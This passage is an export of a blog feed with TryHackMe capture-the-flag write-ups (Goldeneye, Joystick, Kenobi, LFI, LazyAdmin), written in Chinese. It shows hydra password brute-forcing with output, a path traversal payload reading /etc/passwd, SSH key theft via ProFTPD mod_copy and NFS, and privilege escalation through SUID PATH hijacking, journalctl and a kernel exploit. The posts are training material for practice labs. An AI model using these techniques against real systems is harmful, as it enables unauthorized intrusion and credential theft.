<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Username:boris</span><br><span class="line">Password:&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#1</span><br><span class="line">07;&amp;#51;&amp;#114;</span><br></pre></td></tr></table></figure>

<p>除此之外，源代码还透露了一个目录/sev-home/</p>
<p>登陆上去看的话会多透露一个用户名</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927101541464.png" alt="image-20200927101541464"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Username:natalya</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200927145238609.png" alt="image-20200927145238609"></p>
<p>到这里，web的线索就断了，提示我们pop3有东西。。</p>
<h3 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h3><p>用已知的用户名和密码尝试登陆</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927101828166.png" alt="image-20200927101828166"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l natalya -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt -s 55007</span><br><span class="line">10.10.179.148 pop3</span><br><span class="line"></span><br><span class="line">hydra -l boris -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt -s 55007</span><br><span class="line">10.10.179.148 pop3</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/image-20200927111542299.png" alt="image-20200927111542299"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200927111617312.png" alt="image-20200927111617312"></p>
<p>登陆boris的邮箱账号，阅读邮件后，第三封邮件获得一个用户名</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927112033802.png" alt="image-20200927112033802"></p>
<p>Boris的账号没什么收获，去登陆下natalya的账号</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927112244746.png" alt="image-20200927112244746"></p>
<p>噢，这有个明文的账号密码，然后这里说还要添加个解析</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'10.10.179.148 severnaya-station.com'</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>然后访问<a href="http://severnaya-station.com/gnocertdir/" target="_blank" rel="noopener">http://severnaya-station.com/gnocertdir/</a></p>
<p><img src="https://images.atsud0.me/images/post/image-20200927113202500.png" alt="image-20200927113202500"></p>
<p>登陆进来后到处看看，感觉这个账号应该不是管理员。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927113717030.png" alt="image-20200927113717030"></p>
<p>这个人有说自己的邮箱用户名，尝试爆破一哈</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927114046204.png" alt="image-20200927114046204"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200927114142555.png" alt="image-20200927114142555"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop3 </span><br><span class="line">username:doak</span><br><span class="line">password:goat</span><br><span class="line"></span><br><span class="line">web</span><br><span class="line">username:dr_doak</span><br><span class="line">password:4England!</span><br></pre></td></tr></table></figure>



<p>登陆进去之后，Myhome页面左侧有个名字是secret的txt文件。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927145044629.png" alt="image-20200927145044629"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200927143606375.png" alt="image-20200927143606375"></p>
<p>这里已经提示我们密码在/dir007key/for-007.jpg上面了。</p>
<p>下载图片后，用strings的话就会发现base64加密的密码了</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927123137069.png" alt="image-20200927123137069"></p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>登陆进admin后，会发现多了很多可以设置的地方。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927144006434.png" alt="image-20200927144006434"></p>
<p>在这里修改aspell的路径地址为反弹shell的命令。然后随便新建一个页面。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927144059004.png" alt="image-20200927144059004"></p>
<p>监听后，在页面编辑点语法检查（HTML隔壁那个按钮，即可拿到shell。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927144229021.png" alt="image-20200927144229021"></p>
<p>这里我进行信息收集后，感觉最有戏的还是内核提权。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927144313918.png" alt="image-20200927144313918"></p>
<p>然鹅，现实打了我脸，我一脸懵逼的看着报错居然没有gcc？</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927144409920.png" alt="image-20200927144409920"></p>
<p>看到这里你可能会说，攻击机编译一个上去不就好了，但是。。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927144453427.png" alt="image-20200927144453427"></p>
<p>看了下源码，最后还要编译一个动态链接文件，所以没有gcc不行吧？</p>
<p>但是我手动搜索了下好像是有安装gcc的依赖。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927134058844.png" alt="image-20200927134058844"></p>
<p>找了半天，最后回去www的目录下找线索，看到/var/www/html/splashAdmin.php这个文件后才发现原来是被替换掉了。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927134850049.png" alt="image-20200927134850049"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed &#39;s&#x2F;gcc&#x2F;clang&#x2F;g&#39; 37292.c &gt; test.c #将gcc 替换成clang</span><br><span class="line"></span><br><span class="line">clang test.c -o test #编译</span><br><span class="line">.&#x2F;test</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200927135451123.png" alt="image-20200927135451123"></p>
<h2 id="0x03-其他路径"><a href="#0x03-其他路径" class="headerlink" title="0x03 其他路径"></a>0x03 其他路径</h2><p>msfconsole的multi/http/moodle_cmd_exec模块我感觉也能利用成功，但是我实际上是没有成功。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927150510606.png" alt="image-20200927150510606"></p>
<p>感觉应该是rhost的问题。。但是一设置成域名的形式就会自动变回ip，搞不懂。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Moodle</tag>
        <tag>POP3</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Joystick</title>
    <url>/2020/06/23/TryHackMe-Joystick/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://tryhackme.com/room/joystick" target="_blank" rel="noopener">靶机链接</a></p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-06-23 09:57 CST</span><br><span class="line">Nmap scan report for 192.168.10.154</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE   VERSION</span><br><span class="line">21&#x2F;tcp    open  ftp       vsftpd 3.0.3</span><br><span class="line">|_ftp-anon: got code 500 &quot;OOPS: vsftpd: refusing to run with writable root inside chroot()&quot;.</span><br><span class="line">22&#x2F;tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 c7:ce:5d:fa:24:68:3a:10:63:f9:28:1b:f4:6d:e5:bc (RSA)</span><br><span class="line">|   256 6b:7b:f5:12:e0:db:bb:b0:ca:f8:f8:c0:84:bc:27:e6 (ECDSA)</span><br><span class="line">|_  256 1b:d4:20:23:d0:5b:32:16:ad:c2:a9:cd:99:1c:e6:6e (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: JoyStick Gaming</span><br><span class="line">25565&#x2F;tcp open  minecraft Minecraft 1.13.2 (Protocol: 127, Message: A Minecraft Server, Users: 0&#x2F;20)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_110146.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_110205.jpg" alt=""></p>
<p>信息泄露,ftp不工作,user steve应该是ssh用户.这段话也提到了password,猜测是弱密码,尝试爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hydra -l steve -P ~&#x2F;tools&#x2F;rockyou.txt ssh:&#x2F;&#x2F;192.168.10.154 -t 64</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-06-23 10:16:47</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344400 login tries (l:1&#x2F;p:14344400), ~224132 tries per task</span><br><span class="line">[DATA] attacking ssh:&#x2F;&#x2F;192.168.10.154:22&#x2F;</span><br><span class="line"></span><br><span class="line">[STATUS] 797.00 tries&#x2F;min, 797 tries in 00:01h, 14343696 to do in 299:58h, 64 active</span><br><span class="line">[STATUS] 583.00 tries&#x2F;min, 1749 tries in 00:03h, 14342780 to do in 410:02h, 64 active</span><br><span class="line">[STATUS] 519.00 tries&#x2F;min, 3633 tries in 00:07h, 14340896 to do in 460:32h, 64 active</span><br><span class="line">[22][ssh] host: 192.168.10.154   login: steve   password: changeme</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 51 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 51 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2020-06-23 10:24:06</span><br></pre></td></tr></table></figure>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录成功.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_110538.jpg" alt=""></p>
<p>没想到这么简单..<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_110711.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_182417.jpg" alt=""></p>
<p>可以往backup.sh或者是run.sh里写反弹shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_110801.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_110851.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://github.com/DarkStar7471/CTF-Write-Ups-And-Items/tree/master/TryHackMe/JoyStick" target="_blank" rel="noopener">靶机作者的writeup</a>里写到</p>
<blockquote>
<p>As a final item of note, this box is meant as a counter modern capture-the-flag design through the inclusion of services which simply don’t work and with unconventional construction logic through the lens of a younger admin. Careful thought was taken to use commands, instructions, and commit mistakes (i.e. misconfigurations and typos) akin to that which a junior admin would make and use.<br>最后要注意的是，该盒子通过包含一些根本无法使用的服务以及不合常规的构建逻辑（通过年轻管理员的眼光），成为一种反现代的标志设计。 仔细考虑过使用命令，指令和提交错误（即，错误的配置和错别字），类似于初级管理员会使用和执行的错误。</p>
</blockquote>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Kenobi</title>
    <url>/2020/04/14/TryHackMe-Kenobi/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/kenobi" target="_blank" rel="noopener">Kenobi</a><br>介绍：</p>
<blockquote>
<p>This room will cover using accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.</p>
</blockquote>
<p>这个靶机将会向你演示如何访问samba的分享目录，并通过操纵proftpd漏洞获得后门，再通过使用SUID文件使权限提升root用户</p>
<p>靶机难度：简单</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -sV -sC --script vuln -oN kenobi 10.10.187.245</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2020-04-11 02:20 UTC</span><br><span class="line">Nmap scan report for ip-10.10.45.140.eu-west-1.compute.internal (10.10.45.140)</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp         ProFTPD 1.3.5</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22&#x2F;tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   &#x2F;admin.html: Possible admin folder</span><br><span class="line">|_  &#x2F;robots.txt: Robots file</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#39;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2007-6750</span><br><span class="line">|_      http:&#x2F;&#x2F;ha.ckers.org&#x2F;slowloris&#x2F;</span><br><span class="line">|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.</span><br><span class="line">111&#x2F;tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp  rpcbind</span><br><span class="line">|   100003  2,3,4       2049&#x2F;tcp  nfs</span><br><span class="line">|   100003  2,3,4       2049&#x2F;udp  nfs</span><br><span class="line">|   100005  1,2,3      40361&#x2F;tcp  mountd</span><br><span class="line">|   100005  1,2,3      49262&#x2F;udp  mountd</span><br><span class="line">|   100021  1,3,4      43179&#x2F;tcp  nlockmgr</span><br><span class="line">|   100021  1,3,4      56568&#x2F;udp  nlockmgr</span><br><span class="line">|   100227  2,3         2049&#x2F;tcp  nfs_acl</span><br><span class="line">|_  100227  2,3         2049&#x2F;udp  nfs_acl</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">2049&#x2F;tcp open  nfs_acl     2-3 (RPC #100227)</span><br><span class="line">MAC Address: 02:F2:65:5B:D2:FA (Unknown)</span><br><span class="line">Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: false</span><br><span class="line">| smb-vuln-regsvc-dos: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="line">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="line">|       while working on smb-enum-sessions.</span><br><span class="line">|_          </span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 334.90 seconds</span><br></pre></td></tr></table></figure>

<p>根据nmap探测结果，我们可以知道目标机器上有smb服务，http等。</p>
<p>使用nmap smb枚举脚本来查看目前机器分享目录</p>
<p><code>nmap -p445,139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.45.140</code></p>
<p>正常的话，此时应该会有目标机器相关的信息。</p>
<p><strong>类似这样</strong>:<br><img src="https://images.atsud0.me/images/post/3056077b5a1c4de0954a4c16d17e0a60.png" alt="01f813f366f30e4be606bdc5e676bf2d.png"></p>
<p>可以发现anonymous允许匿名访问</p>
<p>通过smbclient去访问匿名目录<br><code>smbclient //10.10.45.140/anonymous</code></p>
<p><img src="https://images.atsud0.me/images/post/011ad16df5624b7cab78604503c92f6b.png" alt="9c957a4d43cc8490c468acb6568d2d93.png"><br>可以发现有个log.txt的文件。<br>通过smbget 下载anonymous目录下的log.txt<br><code>smbget -R smb:10.10.45.150/anonymous/</code></p>
<p><img src="https://images.atsud0.me/images/post/5312a96b5b97456b9a5337d4b965e40b.png" alt="f1c85bda8ceef55fd002477160061a9c.png"><br>可以发现里面有密钥生成的信息和FTP的相关信息。</p>
<p>前面的nmap探测结果也发现了目标机器有打开111端口。</p>
<p><img src="https://images.atsud0.me/images/post/a5692dcb358f46ef8977ae1976165c5f.png" alt="440107d79c87a75d0992e966b0e24874.png"></p>
<p>根据上面的nmap信息探测，我们知道ProFTPD版本是1.3.5<br>使用<code>searchsploit</code>去搜索有什么存在的漏洞。</p>
<p><code>searchsploit ProFTPD 1.3.5</code></p>
<p><img src="https://images.atsud0.me/images/post/41d1ad18c57d4e9585c6856e1fa0939f.png" alt="2b1490354729155ff812dcf2aa104b60.png"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里我们利用这个<a href="http://www.proftpd.org/docs/contrib/mod_copy.html" target="_blank" rel="noopener">mod_copy</a>漏洞</p>
<blockquote>
<p>The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.<br>mod_copy<br>模块实现了SITE CPFR和SITE CPTO命令，可以用来将文件/目录从服务器上的一个地方复制到另一个地方。任何未经认证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到指定路径。</p>
</blockquote>
<p>因为在前面，可以看到目标机器允许挂载var目录，所以我们将密钥复制到var目录下</p>
<p><img src="https://images.atsud0.me/images/post/53524d1686604700bbe42ad59bca4803.png" alt="95937e17e82ad0cc70b12ea669317a7f.png"></p>
<p>创建一个目录，并远程挂载目标机器的var</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;mnt&#x2F;kenobiNFS</span><br><span class="line">mount 10.10.45.140:&#x2F;var &#x2F;mnt&#x2F;kenobiNFS</span><br></pre></td></tr></table></figure>
<h2 id="连接后门"><a href="#连接后门" class="headerlink" title="连接后门"></a>连接后门</h2><p>将刚刚复制到/var下的id_rsa,复制到本机。然后使用ssh -i 连接</p>
<p><img src="https://images.atsud0.me/images/post/19578f8606034881be7413a4f689fe39.png" alt="0bb2c64e5266142e2e202c88aae50af9.png"></p>
<p><code>ssh -i id_rsa kenobi@10.10.45.140</code></p>
<p><img src="https://images.atsud0.me/images/post/cab2812e358440f5a498f355ea45f665.png" alt="7cff46d6c978c10d7721583e20294681.png"><br>拿到flat。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这时候，我们应该考虑提权，去获得第二个flag</p>
<p>Linux系统中，会有部分命令的权限位是<code>rws</code>而不是<code>rwx</code>这些文件被称为SUID文件</p>
<blockquote>
<p>SUID 权限仅对二进制可执行文件有效<br>如果执行者对于该二进制可执行文件具有x的权限，执行者将具有该文件的所有者的权限<br>本权限仅在执行该二进制可执行文件的过程中有效</p>
</blockquote>
<p>所以如果随意设置SUID文件，可能会导致系统很危险。<br>SGID文件同理，只不过SGID,是出现在用户组的x权限位中。<br>如果SGID被用于设置文件，在执行该文件时，用户将获得该文件所属组的权限</p>
<p>而SBIT权限只对目录有效，SBIT对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
<p>关于SUID位的更多资讯<a href="http://louiszhai.github.io/2017/09/30/tmux/#%E5%AF%BC%E8%AF%BB" target="_blank" rel="noopener" title="check here">check here</a>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p>通过这条命令，我们会找到一个很特别的拥有root权限的二进制文件。</p>
<p>尝试执行它</p>
<p><img src="https://images.atsud0.me/images/post/ff73f5cef982472699a152bf17beba73.png" alt="7313d92f0d0da0089947bea50de71dba.png"></p>
<p><img src="https://images.atsud0.me/images/post/2a637b367d9c410bababe350f129af7d.png" alt="0dac81ee2dd4cf70201bb1f79851a91e.png"></p>
<blockquote>
<p>This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).<br>As this file runs as the root users privileges, we can manipulate our path gain a root shell.</p>
</blockquote>
<p>这里我们要先cd到tmp目录。在去将shell重定向到curl<br><img src="https://images.atsud0.me/images/post/f0435877835045d294a6dfeacd28bb31.png" alt="de6edb3f22cfc12374371d4198b3051f.png"><br>拿到flag2</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Metasploit</tag>
        <tag>smb-enum</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-LFI</title>
    <url>/2020/04/20/TryHackMe-LFI/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本篇文章涉及<code>LFI</code>,<code>SSH私钥泄露</code>,<code>二进制文件提权</code></p>
<p>靶机难度:十分简单</p>
<a id="more"></a>


<p>访问网站后，到处看看。因为靶机已经提示是利用<code>LFI</code>了</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>常规思路，上来先扫一扫</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_200012.jpg" alt="namp"></p>
<p><code>dirb</code>只扫出一个目录,去网站看看。</p>
<h3 id="LFI利用漏洞"><a href="#LFI利用漏洞" class="headerlink" title="LFI利用漏洞"></a>LFI利用漏洞</h3><p>根据上文所说的LFI漏洞。这个网站的页面又刚好是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.185.74&#x2F;home?page&#x3D;about</span><br></pre></td></tr></table></figure>
<p>所以可以尝试把<code>about</code>，改成我们想要访问的路径文件，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.185.74&#x2F;home?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_193634.jpg" alt="etc/passwd"></p>
<p>找出系统上的已存在的用户</p>
<p>/etc/passwd文件的结构:</p>
<p><code>falcon:x:1000:1000:用户注释:/home/falcon:/bin/bash</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名:密码是否已加密:USER ID:Group ID:用户注释:家目录:登录shell</span><br></pre></td></tr></table></figure>

<p>成功登录。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_194305.jpg" alt="ssh-success"></p>
<p>发现当前用户能不输入密码的以root身份去执行<code>journalctl</code>。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_195226.jpg" alt="sudo-l"></p>
<p>这是一个查看服务日志的程序，去<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins</a>看看能不能利用。结果还真能。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来就简单了，执行<br><code>sudo journalctl</code><br>输入<code>!/bin/bash</code></p>
<p>拿到root权限</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_195106.jpg" alt="root-shell"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>GTFOBins-journalctl</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-LazyAdmin</title>
    <url>/2020/05/01/TryHackMe-LazyAdmin/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/lazyadmin" target="_blank" rel="noopener">LazyAdmin</a></p>
<p>靶机难度:十分简单</p>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描后只显示打开了两个端口</p>
<ul>
<li>22 openssh 7.2p2</li>
<li>80 Apache 2.4.18</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -sV 10.10.188.166</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-29 22:11 GMT</span><br><span class="line">Nmap scan report for 10.10.188.166</span><br><span class="line">Host is up (0.019s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds</span><br></pre></td></tr></table></figure>

<p>访问网站后什么都没有<br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_222712.jpg" alt="apa"></p>
<p>尝试探测web目录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_222859.jpg" alt="content"></p>
<p>似乎找到了什么有趣的东西，进行再次扫描。同时访问一下这个路径</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200501_223107.jpg" alt="sweetrice"></p>
<p>好像是一个多站点管理系统。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200501_223026.jpg" alt="as"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>通过阅读license.txt，我们可以得知这个管理系统的版本为<code>1.5.1</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200501_223329.jpg" alt="search"></p>
<p>找到的exploit有两个很有趣，一个是任意文件上传，一个是任意文件下载。但是这两个都要身份验证。所以暂时只能继续去web找线索.</p>
<p>通过访问/conetnt/inc，发现了一个sql文件。将这个文件下载下来查看后，找到网站管理员帐号密码,不过是md5加密的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_223511.jpg" alt="sql"></p>
<p>用hashcat跑出来了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_224046.jpg" alt="crack"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>登录网站后台后，我想起有个exploit是可以执行php代码。<a href="https://www.exploit-db.com/exploits/40700" target="_blank" rel="noopener">Cross-Site Request Forgery / PHP Code Execution </a>,使用这个弱点插入一句话。</p>
<p>使用蚁剑成功连上<img src="https://images.atsud0.me/images/post/Screenshot_20200501_224246.jpg" alt="antsword"></p>
<p>查看/etc/passwd后发现还有一个用户<br><img src="https://images.atsud0.me/images/post/photo_2020-05-01_21-34-20.jpg" alt="itguy"></p>
<p>去他的家目录看看，发现一个有趣的文件.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_224549.jpg" alt="backuppl"></p>
